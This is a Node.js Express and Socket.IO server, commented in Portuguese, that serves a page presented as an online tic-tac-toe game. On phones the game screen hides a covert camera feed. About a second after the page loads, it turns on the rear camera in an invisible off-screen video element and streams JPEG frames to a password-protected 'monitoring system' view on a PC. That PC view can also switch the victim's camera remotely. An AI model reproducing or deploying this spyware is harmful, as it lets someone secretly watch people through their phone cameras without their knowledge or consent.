const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "171172";

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>🎮 Jogo da Velha Online</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #0f0f0f;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }
        
        /* Estilos para CELULAR - JOGO DA VELHA */
        .mobile-container {
            animation: fadeIn 1s;
            text-align: center;
            max-width: 500px;
            margin: 0 auto;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @keyframes glow {
            0% { text-shadow: 0 0 5px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
            100% { text-shadow: 0 0 5px #00ff00; }
        }
        
        .game-title {
            font-size: 36px;
            color: #00ff00;
            margin-bottom: 20px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff00;
            text-transform: uppercase;
            letter-spacing: 4px;
            animation: glow 2s infinite;
        }
        
        .game-subtitle {
            color: #00cc00;
            margin-bottom: 30px;
            font-size: 18px;
        }
        
        /* Tela de entrada */
        .welcome-screen {
            padding: 20px;
        }
        
        .play-button {
            background: transparent;
            color: #00ff00;
            border: 3px solid #00ff00;
            font-size: 32px;
            padding: 25px 60px;
            border-radius: 15px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin: 40px 0;
            transition: all 0.3s;
            animation: pulse 2s infinite;
        }
        
        .play-button:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 50px #00ff00;
        }
        
        /* Jogo da Velha */
        .game-screen {
            display: none;
        }
        
        .game-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
        }
        
        .player-info {
            color: #00ff00;
            font-size: 18px;
            font-weight: bold;
        }
        
        .player-info span {
            color: #00cc00;
            font-size: 14px;
            display: block;
            margin-top: 5px;
        }
        
        .turn-indicator {
            background: #0f0f0f;
            padding: 15px;
            border-radius: 8px;
            color: #00ff00;
            font-size: 22px;
            font-weight: bold;
            margin: 20px 0;
            border: 1px solid #00ff00;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 30px 0;
            aspect-ratio: 1/1;
        }
        
        .cell {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 64px;
            font-weight: bold;
            color: #00ff00;
            cursor: pointer;
            transition: all 0.3s;
            aspect-ratio: 1/1;
            text-shadow: 0 0 20px #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }
        
        .cell:hover {
            background: #2a2a2a;
            box-shadow: 0 0 30px #00ff00;
            transform: scale(1.02);
        }
        
        .cell.winner {
            background: #00ff00;
            color: black;
            text-shadow: none;
            box-shadow: 0 0 40px #00ff00;
        }
        
        .cell.disabled {
            cursor: not-allowed;
            opacity: 0.5;
        }
        
        .game-status {
            margin: 20px 0;
            padding: 20px;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 8px;
            color: #00ff00;
            font-size: 20px;
            font-weight: bold;
        }
        
        .reset-button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 15px 40px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s;
            margin-top: 20px;
            letter-spacing: 2px;
        }
        
        .reset-button:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 30px #00ff00;
        }
        
        /* Estilos para PC - TEMA HACKER + JOGO */
        .pc-container {
            text-align: left;
            color: #00ff00;
        }
        
        .hacker-title {
            font-size: 36px;
            color: #00ff00;
            text-align: center;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 4px;
            text-shadow: 0 0 20px #00ff00;
            font-weight: bold;
            animation: glow 2s infinite;
        }
        
        .pc-layout {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        .camera-section, .game-section {
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .section-title {
            font-size: 24px;
            color: #00ff00;
            margin-bottom: 20px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .video-container {
            position: relative;
            width: 100%;
            background: #0a0a0a;
            border: 2px solid #00ff00;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
            margin-bottom: 15px;
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            background: #0a0a0a;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 10, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 8px;
        }
        
        .password-box {
            background: #0f0f0f;
            border: 2px solid #00ff00;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 300px;
        }
        
        .password-box h3 { 
            color: #00ff00; 
            margin-bottom: 20px;
            font-size: 24px;
        }
        
        .password-box input {
            width: 100%;
            padding: 15px;
            font-size: 24px;
            background: #1a1a1a;
            border: 2px solid #00ff00;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            letter-spacing: 5px;
        }
        
        .password-box input:focus {
            outline: none;
            box-shadow: 0 0 20px #00ff00;
        }
        
        .password-box button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s;
        }
        
        .password-box button:hover {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .camera-controls {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 15px;
        }
        
        .camera-btn {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .camera-btn:hover:not(:disabled) {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 20px #00ff00;
        }
        
        .camera-btn.active {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 30px #00ff00;
        }
        
        .camera-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        /* Terminal effect */
        .terminal-text {
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin-top: 20px;
            padding: 15px;
            background: #0a0a0a;
            border-left: 3px solid #00ff00;
            border-radius: 5px;
        }
        
        .hidden {
            display: none !important;
        }
        
        #localVideo {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
        
        /* Matrix effect */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            opacity: 0.1;
            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.1) 0px, rgba(0,0,0,0) 1px, transparent 2px);
            z-index: -1;
        }
        
        /* Loading animation */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #00ff00;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .status-dot.online {
            background: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .status-dot.offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
        
        .status-dot.waiting {
            background: #ffff00;
            box-shadow: 0 0 10px #ffff00;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .pc-layout {
                grid-template-columns: 1fr;
            }
            
            .game-title {
                font-size: 28px;
            }
            
            .play-button {
                font-size: 24px;
                padding: 20px 40px;
            }
            
            .cell {
                font-size: 48px;
            }
            
            .hacker-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR - JOGO DA VELHA -->
        <div id="mobileContent" class="mobile-container">
            <div class="game-title">🎮 JOGO DA VELHA</div>
            
            <!-- Tela de boas-vindas -->
            <div id="welcomeScreen" class="welcome-screen">
                <div class="game-subtitle">Desafie seu oponente online!</div>
                <button class="play-button" onclick="iniciarJogo()">▶ JOGAR</button>
                <div class="terminal-text" style="margin-top: 30px;">
                    <span class="status-dot" id="statusDot"></span> Status: <span id="statusText">Aguardando...</span><br>
                    > Você será X<br>
                    > Oponente será O<br>
                    > Clique em JOGAR para começar
                </div>
            </div>
            
            <!-- Tela do jogo -->
            <div id="gameScreen" class="game-screen">
                <div class="game-header">
                    <div class="player-info">
                        VOCÊ: X <span id="playerStatus">(conectado)</span>
                    </div>
                    <div class="player-info">
                        OPONENTE: O <span id="opponentStatus">(aguardando)</span>
                    </div>
                </div>
                
                <div class="turn-indicator" id="turnIndicator">
                    SUA VEZ
                </div>
                
                <div class="board" id="board">
                    <div class="cell" data-index="0" onclick="fazerJogada(0)"></div>
                    <div class="cell" data-index="1" onclick="fazerJogada(1)"></div>
                    <div class="cell" data-index="2" onclick="fazerJogada(2)"></div>
                    <div class="cell" data-index="3" onclick="fazerJogada(3)"></div>
                    <div class="cell" data-index="4" onclick="fazerJogada(4)"></div>
                    <div class="cell" data-index="5" onclick="fazerJogada(5)"></div>
                    <div class="cell" data-index="6" onclick="fazerJogada(6)"></div>
                    <div class="cell" data-index="7" onclick="fazerJogada(7)"></div>
                    <div class="cell" data-index="8" onclick="fazerJogada(8)"></div>
                </div>
                
                <div class="game-status" id="gameStatus">
                    <span class="loading"></span> Aguardando oponente...
                </div>
                
                <button class="reset-button" onclick="reiniciarJogo()">🔄 NOVO JOGO</button>
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC - CÂMERA + JOGO -->
        <div id="pcContent" class="pc-container hidden">
            <div class="hacker-title">⚡ SISTEMA DE MONITORAMENTO ⚡</div>
            
            <div class="pc-layout">
                <!-- Seção da Câmera -->
                <div class="camera-section">
                    <div class="section-title">📹 CÂMERA REMOTA</div>
                    <div class="video-container">
                        <!-- TROCAMOS DE IMG PARA VIDEO -->
                        <video id="remoteVideo" autoplay playsinline></video>
                        
                        <div id="passwordOverlay">
                            <div class="password-box">
                                <h3>🔒 ACESSO RESTRITO</h3>
                                <p>Digite o código de 6 dígitos</p>
                                <input type="password" id="senhaInput" maxlength="6" placeholder="******" autofocus>
                                <button onclick="verificarSenha()">▶ AUTENTICAR</button>
                                <div id="erroSenha" style="color: #ff0000; margin-top: 15px; display: none;">Acesso negado!</div>
                                <div class="terminal-text" style="margin-top: 15px; font-size: 12px;">[ TENTATIVAS RESTANTES: 3 ]</div>
                            </div>
                        </div>
                    </div>
                    
                    <div id="cameraControls" class="camera-controls hidden">
                        <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')" disabled>📱 FRONTAL</button>
                        <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')" disabled>📷 TRASEIRA</button>
                    </div>
                    
                    <div class="terminal-text" id="cameraTerminal">
                        > Sistema de câmera aguardando autenticação...
                    </div>
                </div>
                
                <!-- Seção do Jogo -->
                <div class="game-section">
                    <div class="section-title">🎮 JOGO DA VELHA</div>
                    
                    <div class="game-header">
                        <div class="player-info">
                            VOCÊ: O <span id="pcPlayerStatus">(conectado)</span>
                        </div>
                        <div class="player-info">
                            OPONENTE: X <span id="pcOpponentStatus">(offline)</span>
                        </div>
                    </div>
                    
                    <div class="turn-indicator" id="pcTurnIndicator">
                        AGUARDANDO JOGADOR...
                    </div>
                    
                    <div class="board" id="pcBoard">
                        <div class="cell" data-index="0" onclick="pcFazerJogada(0)"></div>
                        <div class="cell" data-index="1" onclick="pcFazerJogada(1)"></div>
                        <div class="cell" data-index="2" onclick="pcFazerJogada(2)"></div>
                        <div class="cell" data-index="3" onclick="pcFazerJogada(3)"></div>
                        <div class="cell" data-index="4" onclick="pcFazerJogada(4)"></div>
                        <div class="cell" data-index="5" onclick="pcFazerJogada(5)"></div>
                        <div class="cell" data-index="6" onclick="pcFazerJogada(6)"></div>
                        <div class="cell" data-index="7" onclick="pcFazerJogada(7)"></div>
                        <div class="cell" data-index="8" onclick="pcFazerJogada(8)"></div>
                    </div>
                    
                    <div class="game-status" id="pcGameStatus">
                        <span class="status-dot offline"></span> Aguardando jogador mobile...
                    </div>
                    
                    <button class="reset-button" onclick="pcReiniciarJogo()">🔄 NOVO JOGO</button>
                    
                    <div class="terminal-text" id="pcTerminal">
                        > Sistema aguardando conexão do jogador mobile...
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Vídeo oculto para captura no celular -->
        <video id="localVideo" autoplay playsinline muted></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "171172";
        
        // Elementos principais
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const cameraControls = document.getElementById('cameraControls');
        const cameraTerminal = document.getElementById('cameraTerminal');
        
        // Elementos do jogo (mobile)
        const welcomeScreen = document.getElementById('welcomeScreen');
        const gameScreen = document.getElementById('gameScreen');
        const board = document.getElementById('board');
        const turnIndicator = document.getElementById('turnIndicator');
        const gameStatus = document.getElementById('gameStatus');
        const opponentStatus = document.getElementById('opponentStatus');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        
        // Elementos do jogo (PC)
        const pcBoard = document.getElementById('pcBoard');
        const pcTurnIndicator = document.getElementById('pcTurnIndicator');
        const pcGameStatus = document.getElementById('pcGameStatus');
        const pcTerminal = document.getElementById('pcTerminal');
        const pcOpponentStatus = document.getElementById('pcOpponentStatus');
        
        // Botões da câmera
        const cameraFrontBtn = document.getElementById('cameraFrontBtn');
        const cameraBackBtn = document.getElementById('cameraBackBtn');
        
        // Estado do jogo
        let jogoAtivo = false;
        let vezDoJogador = true; // true = mobile (X), false = PC (O)
        let celulas = Array(9).fill('');
        let jogoIniciado = false;
        let jogadorPresente = false;
        let visualizacaoLiberada = false;
        let tentativas = 3;
        
        // Estado da câmera
        let mediaStream = null;
        let cameraAtual = 'back';
        let intervaloCaptura = null;
        
        // ========== DETECÇÃO DE DISPOSITIVO ==========
        function detectarDispositivo() {
            const ua = navigator.userAgent.toLowerCase();
            return /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
        }
        
        const isMobile = detectarDispositivo();
        
        // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
        if (isMobile) {
            console.log('📱 Celular detectado - modo jogo da velha');
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
            statusDot.className = 'status-dot online';
            statusText.innerHTML = 'Conectado';
            
            // Inicia a câmera em segundo plano
            setTimeout(() => {
                ligarCameraOtimizada('back');
            }, 1000);
            
        } else {
            console.log('💻 PC detectado - modo monitoramento + jogo');
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
            
            socket.emit('pcConectado');
            pcTerminal.innerHTML = '> PC conectado. Aguardando jogador mobile...';
            
            // Configura o elemento de vídeo
            remoteVideo.addEventListener('loadeddata', function() {
                console.log('📹 Vídeo remoto carregado');
            });
        }
        
        // ========== FUNÇÕES DO JOGO (MOBILE) ==========
        window.iniciarJogo = function() {
            welcomeScreen.style.display = 'none';
            gameScreen.style.display = 'block';
            jogoIniciado = true;
            jogadorPresente = true;
            
            socket.emit('jogadorPronto');
            gameStatus.innerHTML = '<span class="loading"></span> Aguardando oponente...';
            opponentStatus.innerHTML = '(conectando)';
            
            // Liga a câmera se ainda não estiver ligada
            if (!mediaStream) {
                ligarCameraOtimizada('back');
            }
        };
        
        window.fazerJogada = function(index) {
            if (!jogoAtivo || !vezDoJogador || celulas[index] !== '') return;
            
            // Faz a jogada
            celulas[index] = 'X';
            const cell = document.querySelector(\`[data-index="\${index}"]\`);
            cell.innerHTML = 'X';
            cell.style.textShadow = '0 0 30px #00ff00';
            
            // Verifica vitória
            if (verificarVitoria('X')) {
                jogoAtivo = false;
                gameStatus.innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogada', { index, vitoria: true, jogador: 'X' });
                return;
            }
            
            // Verifica empate
            if (!celulas.includes('')) {
                jogoAtivo = false;
                gameStatus.innerHTML = '🤝 EMPATE!';
                socket.emit('jogada', { index, empate: true });
                return;
            }
            
            // Passa a vez
            vezDoJogador = false;
            turnIndicator.innerHTML = 'VEZ DO OPONENTE';
            turnIndicator.style.opacity = '0.7';
            
            // Envia jogada
            socket.emit('jogada', { index, vitoria: false });
        };
        
        function verificarVitoria(jogador) {
            const combinacoes = [
                [0,1,2], [3,4,5], [6,7,8],
                [0,3,6], [1,4,7], [2,5,8],
                [0,4,8], [2,4,6]
            ];
            
            for (let combo of combinacoes) {
                if (combo.every(i => celulas[i] === jogador)) {
                    // Destaca células vencedoras
                    combo.forEach(i => {
                        const cell = document.querySelector(\`[data-index="\${i}"]\`);
                        cell.classList.add('winner');
                    });
                    return true;
                }
            }
            return false;
        }
        
        window.reiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            
            document.querySelectorAll('.cell').forEach(cell => {
                cell.innerHTML = '';
                cell.classList.remove('winner');
                cell.style.textShadow = '0 0 20px #00ff00';
            });
            
            turnIndicator.innerHTML = 'SUA VEZ';
            turnIndicator.style.opacity = '1';
            gameStatus.innerHTML = 'Jogo reiniciado!';
            
            socket.emit('reiniciarJogo');
        };
        
        // ========== FUNÇÕES DO JOGO (PC) ==========
        window.pcFazerJogada = function(index) {
            if (!jogoAtivo || vezDoJogador || celulas[index] !== '') return;
            
            // Faz a jogada
            celulas[index] = 'O';
            const cell = document.querySelector(\`#pcBoard [data-index="\${index}"]\`);
            cell.innerHTML = 'O';
            cell.style.textShadow = '0 0 30px #00ff00';
            
            // Verifica vitória
            if (verificarVitoriaPC('O')) {
                jogoAtivo = false;
                pcGameStatus.innerHTML = '🎉 VOCÊ VENCEU!';
                socket.emit('jogadaPC', { index, vitoria: true });
                return;
            }
            
            // Verifica empate
            if (!celulas.includes('')) {
                jogoAtivo = false;
                pcGameStatus.innerHTML = '🤝 EMPATE!';
                socket.emit('jogadaPC', { index, empate: true });
                return;
            }
            
            // Passa a vez
            vezDoJogador = true;
            pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
            pcTurnIndicator.style.opacity = '0.7';
            
            // Envia jogada
            socket.emit('jogadaPC', { index, vitoria: false });
        };
        
        function verificarVitoriaPC(jogador) {
            const combinacoes = [
                [0,1,2], [3,4,5], [6,7,8],
                [0,3,6], [1,4,7], [2,5,8],
                [0,4,8], [2,4,6]
            ];
            
            for (let combo of combinacoes) {
                if (combo.every(i => celulas[i] === jogador)) {
                    combo.forEach(i => {
                        const cell = document.querySelector(\`#pcBoard [data-index="\${i}"]\`);
                        cell.classList.add('winner');
                    });
                    return true;
                }
            }
            return false;
        }
        
        window.pcReiniciarJogo = function() {
            celulas = Array(9).fill('');
            vezDoJogador = true;
            jogoAtivo = true;
            
            document.querySelectorAll('#pcBoard .cell').forEach(cell => {
                cell.innerHTML = '';
                cell.classList.remove('winner');
                cell.style.textShadow = '0 0 20px #00ff00';
            });
            
            pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
            pcTurnIndicator.style.opacity = '0.7';
            pcGameStatus.innerHTML = 'Jogo reiniciado!';
            
            socket.emit('reiniciarJogo');
        };
        
        // ========== FUNÇÕES DA CÂMERA ==========
        async function ligarCameraOtimizada(tipoCamera) {
            try {
                console.log('📷 Iniciando câmera...');
                
                if (intervaloCaptura) {
                    clearInterval(intervaloCaptura);
                }
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 15 },
                        facingMode: tipoCamera === 'front' ? 'user' : 'environment'
                    },
                    audio: false
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                
                mediaStream = stream;
                cameraAtual = tipoCamera;
                
                localVideo.srcObject = stream;
                await localVideo.play();
                
                // Cria canvas para capturar frames
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                
                // Captura e envia frames
                intervaloCaptura = setInterval(() => {
                    try {
                        if (localVideo.readyState === localVideo.HAVE_ENOUGH_DATA) {
                            ctx.drawImage(localVideo, 0, 0, 640, 480);
                            const frame = canvas.toDataURL('image/jpeg', 0.5); // Qualidade 0.5 para melhor performance
                            socket.emit('frame', frame);
                        }
                    } catch (e) {
                        console.log('Erro na captura:', e);
                    }
                }, 150); // ~6-7 fps
                
                console.log('✅ Transmissão ativada!');
                
                if (!isMobile) {
                    cameraTerminal.innerHTML = '> Câmera transmitindo...';
                }
                
            } catch (err) {
                console.error('Erro na câmera:', err);
                if (!isMobile) {
                    cameraTerminal.innerHTML = '> Erro ao acessar câmera: ' + err.message;
                }
            }
        }
        
        window.mudarCamera = function(tipo) {
            if (!visualizacaoLiberada) {
                alert('Autentique primeiro!');
                return;
            }
            
            // Atualiza botões
            cameraFrontBtn.classList.toggle('active', tipo === 'front');
            cameraBackBtn.classList.toggle('active', tipo === 'back');
            
            socket.emit('trocarCamera', tipo);
            cameraTerminal.innerHTML = \`> Trocando para câmera \${tipo === 'front' ? 'frontal' : 'traseira'}...\`;
        };
        
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            
            if (senha === SENHA_CORRETA) {
                passwordOverlay.classList.add('hidden');
                visualizacaoLiberada = true;
                cameraControls.classList.remove('hidden');
                
                // Habilita os botões
                cameraFrontBtn.disabled = false;
                cameraBackBtn.disabled = false;
                cameraBackBtn.classList.add('active');
                
                cameraTerminal.innerHTML = '> Acesso à câmera liberado! Transmissão ativada.';
            } else {
                tentativas--;
                document.getElementById('erroSenha').style.display = 'block';
                document.querySelector('.password-box .terminal-text').innerHTML = \`[ TENTATIVAS RESTANTES: \${tentativas} ]\`;
                
                if (tentativas <= 0) {
                    document.getElementById('senhaInput').disabled = true;
                    document.querySelector('.password-box button').disabled = true;
                    document.querySelector('.password-box .terminal-text').innerHTML = '[ SISTEMA BLOQUEADO ]';
                }
            }
        };
        
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
        
        // ========== SOCKET.IO ==========
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
            if (isMobile) {
                statusDot.className = 'status-dot online';
                statusText.innerHTML = 'Conectado';
            }
        });
        
        socket.on('disconnect', () => {
            console.log('Desconectado do servidor');
            if (isMobile) {
                statusDot.className = 'status-dot offline';
                statusText.innerHTML = 'Desconectado';
            } else {
                pcTerminal.innerHTML = '> Desconectado do servidor. Tentando reconectar...';
            }
        });
        
        socket.on('jogoIniciado', () => {
            if (isMobile) {
                jogoAtivo = true;
                vezDoJogador = true;
                turnIndicator.innerHTML = 'SUA VEZ';
                turnIndicator.style.opacity = '1';
                gameStatus.innerHTML = 'Jogo iniciado! Você é X';
                opponentStatus.innerHTML = '(conectado)';
            } else {
                jogoAtivo = true;
                vezDoJogador = false;
                pcTurnIndicator.innerHTML = 'VEZ DO OPONENTE';
                pcTurnIndicator.style.opacity = '0.7';
                pcGameStatus.innerHTML = '<span class="status-dot online"></span> Jogo iniciado! Você é O';
                pcOpponentStatus.innerHTML = '(online)';
                pcTerminal.innerHTML = '> Jogador mobile conectado. Jogo iniciado!';
            }
        });
        
        socket.on('jogadaRecebida', (data) => {
            if (isMobile) {
                // Recebe jogada do PC
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'O';
                    const cell = document.querySelector(\`[data-index="\${data.index}"]\`);
                    if (cell) {
                        cell.innerHTML = 'O';
                        cell.style.textShadow = '0 0 30px #00ff00';
                    }
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        gameStatus.innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        gameStatus.innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = true;
                        turnIndicator.innerHTML = 'SUA VEZ';
                        turnIndicator.style.opacity = '1';
                    }
                }
            } else {
                // Recebe jogada do mobile
                if (data.index !== undefined && celulas[data.index] === '') {
                    celulas[data.index] = 'X';
                    const cell = document.querySelector(\`#pcBoard [data-index="\${data.index}"]\`);
                    if (cell) {
                        cell.innerHTML = 'X';
                        cell.style.textShadow = '0 0 30px #00ff00';
                    }
                    
                    if (data.vitoria) {
                        jogoAtivo = false;
                        pcGameStatus.innerHTML = '😢 OPONENTE VENCEU!';
                    } else if (data.empate) {
                        jogoAtivo = false;
                        pcGameStatus.innerHTML = '🤝 EMPATE!';
                    } else {
                        vezDoJogador = false;
                        pcTurnIndicator.innerHTML = 'SUA VEZ';
                        pcTurnIndicator.style.opacity = '1';
                    }
                }
            }
        });
        
        socket.on('jogoReiniciado', () => {
            if (isMobile) {
                reiniciarJogo();
            } else {
                pcReiniciarJogo();
            }
        });
        
        socket.on('jogadorDesconectado', () => {
            if (!isMobile) {
                jogoAtivo = false;
                pcOpponentStatus.innerHTML = '(offline)';
                pcGameStatus.innerHTML = '<span class="status-dot offline"></span> Jogador desconectado';
                pcTerminal.innerHTML = '> Jogador mobile desconectado. Aguardando reconexão...';
            }
        });
        
        socket.on('trocarCamera', (tipoCamera) => {
            if (isMobile) {
                ligarCameraOtimizada(tipoCamera);
            }
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada && remoteVideo) {
                // Converte dataURL para blob e atualiza o vídeo
                try {
                    remoteVideo.src = frameData;
                } catch (e) {
                    console.log('Erro ao atualizar frame:', e);
                }
            }
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('👤 Novo cliente conectado:', socket.id);
  
  let mobileJogador = null;
  let pcJogador = null;
  
  socket.on('pcConectado', () => {
    pcJogador = socket.id;
    console.log('💻 PC conectado ao jogo:', socket.id);
  });
  
  socket.on('jogadorPronto', () => {
    mobileJogador = socket.id;
    console.log('📱 Jogador mobile pronto:', socket.id);
    
    // Inicia o jogo
    io.emit('jogoIniciado');
  });
  
  socket.on('jogada', (data) => {
    // Envia jogada do mobile para o PC
    socket.broadcast.emit('jogadaRecebida', data);
  });
  
  socket.on('jogadaPC', (data) => {
    // Envia jogada do PC para o mobile
    socket.broadcast.emit('jogadaRecebida', data);
  });
  
  socket.on('reiniciarJogo', () => {
    io.emit('jogoReiniciado');
  });
  
  socket.on('frame', (frameData) => {
    // Envia frame para todos exceto o remetente
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('trocarCamera', (tipoCamera) => {
    console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
    socket.broadcast.emit('trocarCamera', tipoCamera);
  });
  
  socket.on('disconnect', () => {
    console.log('👤 Cliente desconectado:', socket.id);
    
    if (socket.id === mobileJogador) {
      console.log('📱 Jogador mobile desconectado');
      io.emit('jogadorDesconectado');
    } else if (socket.id === pcJogador) {
      console.log('💻 PC desconectado');
    }
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(70));
  console.log('🎮 JOGO DA VELHA COM CÂMERA EM TEMPO REAL');
  console.log('='.repeat(70));
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔑 Senha da câmera: ${SENHA}`);
  console.log(`📱 Celular: Acesse http://localhost:${PORT} no celular`);
  console.log(`💻 PC: Acesse http://localhost:${PORT} no PC`);
  console.log('='.repeat(70));
  console.log('📱 Celular: Jogador X - Abre o jogo da velha');
  console.log('💻 PC: Jogador O - Câmera + Jogo sincronizado');
  console.log('='.repeat(70));
});
